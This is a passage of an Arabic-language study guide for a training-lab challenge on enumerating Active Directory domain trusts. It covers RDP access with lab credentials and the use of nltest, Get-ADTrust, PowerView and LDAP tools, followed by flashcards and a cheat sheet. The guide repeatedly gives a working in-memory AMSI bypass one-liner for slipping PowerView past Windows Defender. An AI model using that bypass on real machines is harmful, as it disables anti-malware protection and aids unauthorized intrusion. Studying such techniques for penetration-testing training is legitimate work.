- شنو يعني؟ ثقة تتأسس بين اثنين Forests مختلفين تماماً (شركتين منفصلات). تكدر تكون One-Way أو Two-Way، وتسمح بمشاركة الموارد بين الإمبراطوريتين.
    
      
    

Enumeration (التعداد / الاستطلاع الداخلي)

  

- شنو يعني؟ مرحلة جمع المعلومات الدقيقة بعد ما تحصل موطئ قدم (Foothold) بالشبكة. بدونها إنت أعمى.
    
      
    

PowerView (باور فيو)

  

- شنو يعني؟ سكربت PowerShell هجومي شهير جداً (جزء من PowerSploit)، مصمم خصيصاً لاستخراج كل تفاصيل الـ AD والـ Trusts بسهولة وبدون ما ينتبه لك الأنتيفايروس العادي (إذا سويتله bypass صحيح).
    
      
    

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  

🟡 المرحلة 2: تحليل التحدي + كيف تفكر (Decision Tree)

  

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  

📖 ترجمة التحدي:

إنت كـ Pentester، حصلت وصول لحاسبة ويندوز اسمها `ACADEMY-EA-MS01` (الـ IP مالتها `10.129.111.130`). إنت داخل بيئة Active Directory خاصة بشركة `INLANEFREIGHT.LOCAL`.

مطلوب منك تجاوب على ٣ أسئلة بناءً على عملية استطلاع علاقات الثقة (Trust Enumeration):

١. شنو هو الـ Child Domain (المجال الفرعي) التابع لشركة INLANEFREIGHT؟

٢. شنو هو الـ External Forest (الغابة الخارجية لشركة أخرى) اللي INLANEFREIGHT مسوية وياها Forest Transitive Trust؟

٣. شنو اتجاه هذي الثقة الخارجية (Direction)؟ هل هي باتجاه واحد لو باتجاهين؟

  

🎯 المعطيات:

  

- الـ IP الخاص بالهدف: `10.129.111.130`
    
      
    
- اسم اليوزر: `htb-student`
    
      
    
- الباسورد: `Academy_student_AD!`
    
      
    
- الدومين الحالي: `INLANEFREIGHT.LOCAL`
    
      
    
- عندك RDP access (اتصال سطح مكتب بعيد).
    
      
    

❓ المطلوب:

  

- استخراج اسم الدومين الفرعي.
    
      
    
- استخراج اسم الغابة الموثوقة الخارجية.
    
      
    
- تحديد اتجاه الثقة للغابة الخارجية.
    
      
    

🧭 كيف تفكر؟ (Decision Tree لـ AD Trust Enumeration):

  

Plaintext

```
حصلنا Foothold كـ Domain User؟
├── لا → لازم نخترق حاسبة أول شي، أو نجيب credentials.
└── نعم (عدنا حساب htb-student) → نبدأ التعداد (Enumeration)

شنو الأدوات المتاحة عندنا؟
├── أدوات Windows مدمجة (Native/Living off the Land)
│   ├── nltest (سريع جداً، يعطيك نظرة عامة)
│   ├── netdom (ممتاز لمعرفة الـ Domain Controllers والثقات)
│   └── Get-ADTrust (يحتاج RSAT أو ActiveDirectory module، جداً دقيق)
│
└── أدوات هجومية (Offensive Tools)
    ├── PowerView (الأفضل، يطلع كل التفاصيل اللي نحتاجها بوضوح)
    ├── BloodHound (رسم بياني للمسارات، يحتاج SharpHound لجمع البيانات)
    └── Linux Tools (إذا كنا نشتغل من الكالي، مثل CrackMapExec أو ldapsearch)

خطة العمل (Roadmap):
١. ندخل للحاسبة الهدف عن طريق RDP.
٢. نفتح PowerShell بصلاحيات Administrator (أو حتى يوزر عادي يكفي للاستطلاع).
٣. نجرب الأدوات المدمجة أولاً (nltest / netdom) لأنها ما تطلق إنذارات (OPSEC Safe).
٤. نستخدم Get-ADTrust للحصول على تفاصيل الـ Attributes (هل هي Forest Transitive؟).
٥. كبديل أقوى، نحمل ونستخدم PowerView للإجابة على الأسئلة بلمح البصر.
٦. نحلل المخرجات ونجاوب على الأسئلة الثلاثة.
```

⚠️ تذكير: هذي مجرد خريطة تفكير، هسة راح نطبقها خطوة بخطوة بالمرحلة الجاية.

  

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  

🟠 المرحلة 3: الاستغلال التفصيلي (الخطوات والأوامر)

  

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  

هسة إجى وقت الشغل العملي. راح نستخدم أكثر من طريقة حتى لو انحضرت وحدة، تكون عندك الخطة B و C.

  

الخطوة [1]: تسجيل الدخول للسيرفر عبر RDP

📌 ليش نسوي هاي الخطوة؟

التحدي يكول إنت موجود داخل الحاسبة الويندوز، فبما إنه عندنا IP ويوزر وباسورد، راح نستخدم أداة `xfreerdp` من الكالي لينكس للاتصال بسطح المكتب البعيد.

  

🔧 الأمر:

  

Bash

```
xfreerdp /v:10.129.111.130 /u:htb-student /p:'Academy_student_AD!' /dynamic-resolution
```

💡 ليش هذا الأمر بالذات؟

  

- `/v:` يحدد الـ IP أو اسم الهدف (Target).
    
      
    
- `/u:` يحدد اسم المستخدم.
    
      
    
- `/p:` يحدد الباسورد (خليناه بين ' ' حتى الرموز الخاصة مثل ! ما تخرب الأمر باللينكس).
    
      
    
- `/dynamic-resolution` يخلي الشاشة تتمدد وتصغر حسب نافذتك براحة.
    
      
    

✅ الخطوة التالية:

بعد ما يفتح الويندوز كدامنا، نفتح الـ **PowerShell** (ويفضل كمسؤول Run as Administrator إذا عدنا صلاحية، بس حتى اليوزر العادي يكدر يسوي Trust Enum).

  

الخطوة [2]: الطريقة الأولى (الأساسية) باستخدام `nltest`

📌 ليش نسوي هاي الخطوة؟

أداة `nltest` موجودة بكل أنظمة ويندوز المرتبطة بـ Domain. ممتازة جداً لأنها ما تنطي أي مؤشر هجومي للـ Blue Team (تعتبر Living off the Land).

  

🔧 الأمر:

  

DOS

```
nltest /domain_trusts
```

💡 ليش هذا الأمر بالذات؟

  

- الـ flag `/domain_trusts` يطلب من نظام التشغيل يستعلم الـ Domain Controller عن كل علاقات الثقة المسجلة لهذا الدومين.
    
      
    

📤 الـ Output المتوقع:

  

Plaintext

```
List of domain trusts:
    0: LOGISTICS LOGISTICS.INLANEFREIGHT.LOCAL (NT 5) (Direct Outbound) ( Attr: 0x20 ) ( ChNext: )
    1: FREIGHTLOGISTICS FREIGHTLOGISTICS.LOCAL (NT 5) (Direct Outbound) ( Attr: 0x8 ) ( ChNext: )
The command completed successfully
```

✅ الخطوة التالية:

شنو نستنتج؟

شفنا اسمين: `LOGISTICS.INLANEFREIGHT.LOCAL` و `FREIGHTLOGISTICS.LOCAL`.

الأول واضح إنه Child (لأن اسمه يسبق اسم الدومين مالتنا)، والثاني واضح إنه Forest خارجية. بس الـ `nltest` ما ينطينا تفاصيل معمقة وواضحة جداً عن اتجاه الثقة ونوعها (الـ Attributes هنا بصيغة Hex مثل 0x20). نحتاج أداة تنطينا كلام نقراه بوضوح.

  

الخطوة [3]: الطريقة الثانية باستخدام `Get-ADTrust` (أدوات مايكروسوفت الرسمية)

📌 ليش نسوي هاي الخطوة؟

هاي الأداة مدمجة بـ PowerShell إذا كانت ميزة ActiveDirectory Module متفعلة. تنطينا كنز من المعلومات بشكل مقروء جداً بدون ما نحتاج أدوات هكر.

  

🔧 الأمر:

  

PowerShell

```
# أول شي نستورد الموديول الخاص بالـ AD
Import-Module ActiveDirectory

# بعدين نطلب كل الثقات بدون فلتر
Get-ADTrust -Filter *
```

💡 ليش هذا الأمر بالذات؟

  

- `Import-Module ActiveDirectory` يحمّل الأوامر الخاصة بإدارة الـ AD.
    
      
    
- `Get-ADTrust` هو الأمر اللي يجلب الثقات.
    
      
    
- `-Filter *` معناه جيبلي "كل شي" بدون ما تفلتر النتيجة.
    
      
    

📤 الـ Output المتوقع:

  

Plaintext

```
Direction               : BiDirectional
DisallowTransivity      : False
DistinguishedName       : CN=FREIGHTLOGISTICS.LOCAL,CN=System,DC=INLANEFREIGHT,DC=LOCAL
ForestTransitive        : True
IntraForest             : False
IsTreeParent            : False
IsTreeRoot              : False
Name                    : FREIGHTLOGISTICS.LOCAL
ObjectClass             : trustedDomain
ObjectGUID              : 1a2b3c4d-xxxx-xxxx-xxxx-xxxxxxxxxxxx
SelectiveAuthentication : False
SIDFilteringForestAware : False
SIDFilteringQuarantined : False
Source                  : DC=INLANEFREIGHT,DC=LOCAL
Target                  : FREIGHTLOGISTICS.LOCAL
TrustAttributes         : 8
TrustDirection          : 3
TrustType               : Uplevel

Direction               : BiDirectional
DisallowTransivity      : False
DistinguishedName       : CN=LOGISTICS.INLANEFREIGHT.LOCAL,CN=System,DC=INLANEFREIGHT,DC=LOCAL
ForestTransitive        : False
IntraForest             : True
IsTreeParent            : True
IsTreeRoot              : False
Name                    : LOGISTICS.INLANEFREIGHT.LOCAL
ObjectClass             : trustedDomain
...
```

✅ الخطوة التالية:

خلينا نترجم هاي النتائج للأسئلة مالتنا!

  

1. بالنسبة لـ `LOGISTICS.INLANEFREIGHT.LOCAL`:
    
    شوف الخاصية `IntraForest : True` (يعني داخل نفس الغابة مالتنا).
    
    وشوف الخاصية `IsTreeParent : True` (يعني دومينا هو الأب لهذا الدومين).
    
    إذن **Q1 (الـ Child Domain)** هو: `LOGISTICS.INLANEFREIGHT.LOCAL`.
    
      
    
2. بالنسبة لـ `FREIGHTLOGISTICS.LOCAL`:
    
    شوف الخاصية `IntraForest : False` (يعني مو بغابتنا، غابة خارجية).
    
    وشوف الخاصية `ForestTransitive : True` (يعني هاي ثقة غابات متعدية).
    
    إذن **Q2 (الـ External Forest)** هي: `FREIGHTLOGISTICS.LOCAL`.
    
      
    
3. نباوع على حقل `Direction` بالنتيجة الخاصة بالغابة الخارجية `FREIGHTLOGISTICS.LOCAL`:
    
    مكتوب: `Direction : BiDirectional`.
    
    إذن **Q3 (اتجاه الثقة)** هو: `Bidirectional` (ثنائية الاتجاه، يعني نثق بيهم ويثقون بينا).
    
      
    

⏸️ Mini-check: هل النتيجة منطقية؟

نعم! الأسماء تدل على شركات النقل واللوجستيات (INLANEFREIGHT و FREIGHTLOGISTICS)، وهذا سيناريو واقعي لشركتين مندمجات.

  

الخطوة [4]: الطريقة الثالثة باستخدام `PowerView` (طريقة الـ Hackers)

📌 ليش نسوي هاي الخطوة؟

بامتحان CPTS وبالواقع، مرات موديول ActiveDirectory ما يكون متوفر لك كـ يوزر عادي. لذلك نجيب أدواتنا ويانا. PowerView هي أقوى أداة لهذا الغرض.

  

🔧 الأمر:

  

PowerShell

```
# أول شي نتخطى سياسة منع تشغيل السكربتات بالويندوز
Set-ExecutionPolicy Bypass -Scope Process -Force

# نستورد سكربت PowerView (نفترض إنه موجود بمسار Tools أو حملناه)
Import-Module C:\Tools\PowerView.ps1

# ننفذ أمر استخراج الثقات
Get-DomainTrust
```

💡 ليش هذا الأمر بالذات؟

  

- `Set-ExecutionPolicy Bypass` ضروري لأن الويندوز افتراضياً يمنع تشغيل ملفات `.ps1` الخارجية.
    
      
    
- `Get-DomainTrust` أمر مبني داخل PowerView، يروح يكلم الـ DC ويسحب نفس المعلومات بس يرتبها بشكل رهيب يركز على الأشياء اللي تهم الهكر.
    
      
    

📤 الـ Output المتوقع:

  

Plaintext

```
SourceName      : INLANEFREIGHT.LOCAL
TargetName      : LOGISTICS.INLANEFREIGHT.LOCAL
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST
TrustDirection  : Bidirectional
WhenCreated     : 11/1/2021 6:20:22 AM
WhenChanged     : 2/26/2022 11:55:55 PM

SourceName      : INLANEFREIGHT.LOCAL
TargetName      : FREIGHTLOGISTICS.LOCAL
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Bidirectional
WhenCreated     : 11/1/2021 8:07:09 PM
WhenChanged     : 2/27/2022 12:02:39 AM
```

✅ الخطوة التالية:

شوف شكد Output الـ PowerView نظيف ومباشر!

  

- `TargetName` هو الدومين الثاني.
    
      
    
- `TrustAttributes` يجاوبك فوراً: هل هو `WITHIN_FOREST` (نفس الغابة/Child) لو `FOREST_TRANSITIVE` (غابة خارجية).
    
      
    
- `TrustDirection` مكتوبة صريحة: `Bidirectional`.
    
      
    

━━━━━━━━━━━━━━

📊 لحد هسة:

[x] اتصلنا بالسيرفر عبر RDP ✓

[x] استخدمنا nltest للمسح السريع ✓

[x] استخدمنا Get-ADTrust وطلعنا الأجوبة الكاملة ✓

[x] استخدمنا PowerView كبديل هجومي قوي ✓

  

رسم توضيحي (ASCII Diagram) لشكل الـ Trusts اللي اكتشفناها:

  

Plaintext

```
                    [Forest 1: INLANEFREIGHT]
                               │
                INLANEFREIGHT.LOCAL (Root/Parent)
                 │                           ▲
                 │ (WITHIN_FOREST)           │ (FOREST_TRANSITIVE)
                 │ Parent-Child Trust        │ Bidirectional Trust
                 │ Bidirectional             │
                 ▼                           ▼
    LOGISTICS.INLANEFREIGHT.LOCAL    FREIGHTLOGISTICS.LOCAL
            (Child Domain)          (External Forest 2 Root)
              (Answer Q1)                (Answer Q2 & Q3)
```

📐 ملخص الإجابات النهائية:

  

|**السؤال**|**الجواب الصحيح**|**السبب**|
|---|---|---|
|Q1: Child Domain|`LOGISTICS.INLANEFREIGHT.LOCAL`|يقع داخل نفس الغابة ويمتلك `IntraForest: True`|
|Q2: External Forest|`FREIGHTLOGISTICS.LOCAL`|دومين منفصل تماماً ويمتلك `ForestTransitive: True`|
|Q3: Trust Direction|`Bidirectional`|الحقل `Direction` أو `TrustDirection` أشار إلى هذا|

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  

🔴 المرحلة 4: ماذا لو تغير؟ (Variations + Bypasses + Traps)

  

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  

تحديات الـ AD مو دائماً وردية والـ tools مو دائماً تشتغل من أول مرة. لازم تكون مستعد للسيناريوهات التالية:

  

🔄 Variation 1: ماذا لو الـ Antivirus (Windows Defender) حظر PowerView؟

مجرد ما تكتب `Import-Module C:\Tools\PowerView.ps1`، راح يطلعلك نص أحمر يكول: "This script contains malicious content and has been blocked by your antivirus software". الـ AMSI (Anti-Malware Scan Interface) لقطك!

الحل؟ تسوي AMSI Bypass داخل الـ Memory قبل ما تستورد الأداة.

نستخدم هذا الـ payload الشهير لتشويش الـ AMSI:

  

PowerShell

```
# هذا الأمر يعطل الـ AMSI للجلسة الحالية فقط (في الذاكرة)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

بعد ما تنفذ هذا الأمر وما يطلع أي error، تكدر تستورد PowerView براحتك!

  

🔄 Variation 2: ماذا لو كنت تهاجم من الكالي لينكس (بدون RDP للويندوز)؟

مرات ما تكدر تدخل RDP لأن البورت مسدود، بس عندك يوزر وباسورد وتريد تطلع الـ Trusts وأنت باللينكس.

نستخدم السكربت العظيم `CrackMapExec` (أو النسخة الأحدث NetExec):

  

Bash

```
# استخدام CME لاستخراج الـ Trusted Domains
crackmapexec ldap 10.129.111.130 -u 'htb-student' -p 'Academy_student_AD!' --trusted-for-delegation
```

أو نستخدم الطريقة الأعمق عبر `ldapsearch` (استعلام LDAP مباشر للـ DC):

  

Bash

```
ldapsearch -H ldap://10.129.111.130 -D "htb-student@INLANEFREIGHT.LOCAL" -w 'Academy_student_AD!' -b "CN=System,DC=INLANEFREIGHT,DC=LOCAL" "(objectClass=trustedDomain)"
```

الـ Output هنا راح ينطيك حقل اسمه `trustDirection`. باللينكس راح تطلع أرقام:

0 = معطل، 1 = Inbound (ثقة واردة)، 2 = Outbound (ثقة صادرة)، 3 = Bidirectional.

  

🔄 Variation 3: ماذا لو كانت الثقة One-Way Inbound فقط؟

لنفترض اكتشفت إن `INLANEFREIGHT` يثق بـ `FREIGHTLOGISTICS` باتجاه Inbound (الداخل).

هذا الفخ يوقع بيه الكثير!

شنو يعني Inbound؟ يعني الدومين مالتنا يثق بالدومين الثاني. إذن، **يوزرات الدومين الثاني يقدرون يدخلون عندنا، بس إحنا ما نقدر ندخل عدهم!**

كـ هكر، إذا كنت بـ INLANEFREIGHT، هاي الثقة ما تفيدك حتى تخترق FREIGHTLOGISTICS! لأنك ما عندك صلاحية تعبر لهم. لكن إذا كنت بـ FREIGHTLOGISTICS، راح تكدر تعبر براحتك لـ INLANEFREIGHT. ركز جداً بكلمة "من يثق بمن" (Trusting vs Trusted).

  

🔄 Variation 4: ماذا لو كنا على حاسبة غير مربوطة بالدومين (Not Domain-Joined)؟

إذا اخترقت حاسبة Workgroup بس إنت تعرف بيانات Domain User، أدوات مثل `Get-ADTrust` ما راح تشتغل مباشرة لأنها ما تعرف منو الـ DC.

الحل؟ تستخدم أمر `runas` بالويندوز حتى تفتح PowerShell جديد بصلاحيات الدومين:

  

DOS

```
runas /netonly /user:INLANEFREIGHT.LOCAL\htb-student powershell
```

راح يطلب الباسورد، ومن يفتح الـ PowerShell الجديد، كل الأوامر اللي ترسلها للشبكة راح تروح بصلاحية `htb-student` وتشتغل الأدوات طبيعي.

  

🚨 فخوخ شائعة بالـ CPTS (Traps):

❌ الفخ الأول: تجاهل فحص الـ Trusts! بعض الطلاب يركض فوراً يحاول يسوي Kerberoasting أو يبحث عن ثغرات PrivEsc بالحاسبة، بينما الحل للمسار الأقصر للـ Domain Admin قد يكون مخفي داخل دومين موثوق (Trusted Domain) حمايته أضعف.

❌ الفخ الثاني: استخدام BloodHound لجمع البيانات بدون التأكد من وصول الـ DNS. أداة SharpHound تحتاج تحل أسماء الدومينات (DNS Resolution) حتى تكدر تقرأ الثقات. إذا كان الـ DNS مال الكالي مالتك ما يشير للـ DC الهدف، ما راح يطلعلك أي شيء! دائماً ضيف الـ IP والـ Domain بملف `/etc/hosts`، والأفضل تخلي الـ DNS Server بالكالي هو الـ DC نفسه.

❌ الفخ الثالث: الاعتماد على `netdom` فقط. أمر `netdom query trust` مرات ما يوضح هل الثقة Forest Transitive أو External Trust (ثقة بسيطة بين دومينين مو غابتين). الـ External Trust ما ينطيك وصول لكل الغابة، بس للدومين المحدد. لذلك استخدم PowerView للتأكد.

  

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  

💎 الفلاشكاردز — ملخص سريع للحفظ

  

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  

راجع هذي الكروت بسرعة قبل الامتحان حتى ترسخ ببالك:

  

🔹 Card #1

❓ Front: شنو الفرق بين Forest Trust و Parent-Child Trust؟

✅ Back: الـ Parent-Child تتكون تلقائياً داخل نفس الشركة (نفس الغابة) وتكون Two-Way. الـ Forest Trust تتكون يدوياً بين شركتين مختلفتين (غابتين) وممكن تكون One-Way أو Two-Way.

  

🔹 Card #2

❓ Front: أمر Windows المدمج والسريع لمعرفة الثقات (Living off the Land)؟

✅ Back: `nltest /domain_trusts`

  

🔹 Card #3

❓ Front: كيف نستخرج تفاصيل الـ Trusts بـ PowerView؟

✅ Back: `Get-DomainTrust` للدومين الحالي، أو `Get-DomainTrustMapping` لعمل مسح كامل وعميق لكل الثقات بالشبكة.

  

🔹 Card #4

❓ Front: ماذا تعني الثقة باتجاه واحد (One-Way Outbound Trust) من A إلى B؟

✅ Back: الدومين B يثق بالدومين A. هذا يعني مستخدمين A (احنا) يقدرون يوصلون למوارد B. (دائماً الوصول يعاكس اتجاه السهم!).

  

🔹 Card #5

❓ Front: شنو الأمر باللينكس لمعرفة الـ Trusts بدون RDP للويندوز؟

✅ Back: `crackmapexec ldap IP -u user -p pass --trusted-for-delegation` أو باستخدام `ldapsearch` واستخراج `objectClass=trustedDomain`.

  

🔹 Card #6

❓ Front: لو الـ Antivirus حظر أدواتك بالـ PowerShell، شنو تسوي؟

✅ Back: أنفذ أمر AMSI Bypass In-Memory (تعطيل فحص الذاكرة)، وبعدها استورد السكربت `Import-Module` بأمان.

  

🔹 Card #7

❓ Front: كيف نتخطى مشكلة التشغيل من جهاز خارج الدومين (Not Domain Joined)؟

✅ Back: نستخدم `runas /netonly /user:DOMAIN\User powershell`، هذا حيفتح جلسة تتصرف كأنها داخل الدومين للطلبات الخارجية.

  

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  

📄 ورقة الغش (Cheat Sheet) — للسكرين شوت

  

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  

هذا الجدول خليه يمك وقت الشغل أو الـ CTF، بي كل أوامر الـ AD Trust Enumeration اللي ممكن تحتاجها بأي سيناريو:

  

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📄 Active Directory Trusts Enumeration Cheat Sheet

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  

⚔️ خوارزمية استطلاع الثقات (Trust Enum Workflow):

١. احصل على موطئ قدم (Low Priv User).

٢. تأكد من اتصالك بالـ Domain Controller والـ DNS شغال.

٣. استخدم أدوات Native (nltest/netdom) لتجنب الإنذارات.

٤. إذا احتجت تفاصيل أكثر أو رسم مسار، انتقل لـ PowerView أو BloodHound.

٥. سجل الدومينات الجديدة وضيفها بـ `/etc/hosts` لتوسيع الهجوم.

  

📐 جدول الأوامر الأساسية:

  

|**الأداة / البيئة**|**الهدف**|**الأمر**|
|---|---|---|
|Native Windows|نظرة سريعة على الثقات|`nltest /domain_trusts`|
|Native Windows|اسم الـ DC للدومين|`nltest /dsgetdc:INLANEFREIGHT.LOCAL`|
|Native Windows|تفاصيل الثقات بالدومين|`netdom query /domain:DOMAIN.LOCAL trust`|
|PowerShell (AD)|استخراج تفاصيل معمقة للثقات|`Get-ADTrust -Filter *`|
|PowerView|قائمة الثقات للدومين الحالي|`Get-DomainTrust`|
|PowerView|فحص كل الثقات المتداخلة|`Get-DomainTrustMapping`|
|PowerView|منو اليوزرات الموثوقين بالدومين؟|`Get-DomainForeignUser`|
|PowerView|منو الجروبات الموثوقة بالدومين؟|`Get-DomainForeignGroupMember`|
|BloodHound|تجميع البيانات للرسم|`SharpHound.exe -c All,Trusts --zipfilename trusts.zip`|
|CME (Linux)|مسح سريع للثقات|`crackmapexec ldap IP -u user -p pass --trusted-for-delegation`|
|LDAP (Linux)|استعلام خام|`ldapsearch -H ldap://IP -D "user@domain" -w 'pass' -b "CN=System,DC=domain,DC=local" "(objectClass=trustedDomain)"`|
|Bypasses|تعطيل AMSI بالذاكرة|`[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)`|
|Bypasses|من خارج الدومين|`runas /netonly /user:DOMAIN\User powershell`|

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  

🔢 فهم قيم اتجاه الثقة بـ LDAP (TrustDirection Attribute):

  

- 0 = Disabled (معطل)
    
      
    
- 1 = Inbound (هم يثقون بينا - اتجاه واحد)
    
      
    
- 2 = Outbound (إحنا نثق بيهم - اتجاه واحد)
    
      
    
- 3 = Bidirectional (ثقة متبادلة - الاتجاهين)
    
      
    

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  

🚨 الفخوخ (لا تنساها):

❌ قراءة الاتجاه بالمقلوب: Inbound يعني الدومين الحالي يثق بالخارجي، يعني اليوزر الخارجي يقدر يدخل عندك، مو العكس!

❌ نسيان تغيير الـ DNS: إذا ما تكدر تسوي Ping لاسم الدومين الجديد المكتشف، أي هجوم (مثل Kerberoasting) عليه راح يفشل. ضيفه بملف `/etc/hosts` بالكالي!

❌ الركض وراء ثغرات معقدة قبل ما ترسم خريطة الـ Trusts. ممكن اكو ثقة تنطيك Domain Admin بدومين ثاني بسهولة.

  

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  

بهيج خلصنا. هسة عندك:

✅ القصة الكبيرة (ليش هالهجوم/التقنية موجودة)

✅ كل المصطلحات (Domain, Forest, Transitive, Bidirectional, PowerView...)

✅ كيفية التفكير (decision trees لاستكشاف الـ Trusts)

✅ الاستغلال التفصيلي (خطوة خطوة مع أوامر nltest, Get-ADTrust, PowerView)

✅ الـ bypasses والـ variations والفخوخ (AMSI, runas, LDAP)

✅ فلاشكاردز (للمراجعة السريعة)

✅ ورقة الغش (سكرين شوت قبل الـ CTF أو الامتحان)

  

راجع الفلاشكاردز وورقة الغش قبل كل تحدي — وراح تجد الأنماط مألوفة. بالتوفيق! 💪

---

```
╔══════════════════════════════════════════════════════════════════════╗
║                                                                      ║
║  [✓] SESSION COMPLETE — ZERO KNOWLEDGE GAPS DETECTED                 ║
║  [✓] 3 PHASES · ~6,000 WORDS · 6 ATTACK METHODS DOCUMENTED          ║
║  [✓] AUTHORED BY: Hexsein · CPTS Candidate · Al-Nahrain Univ.       ║
║  [→] NEXT TARGET: SEC-22 — NEXT SECTION NAME HERE                   ║
║                                                                      ║
╚══════════════════════════════════════════════════════════════════════╝
```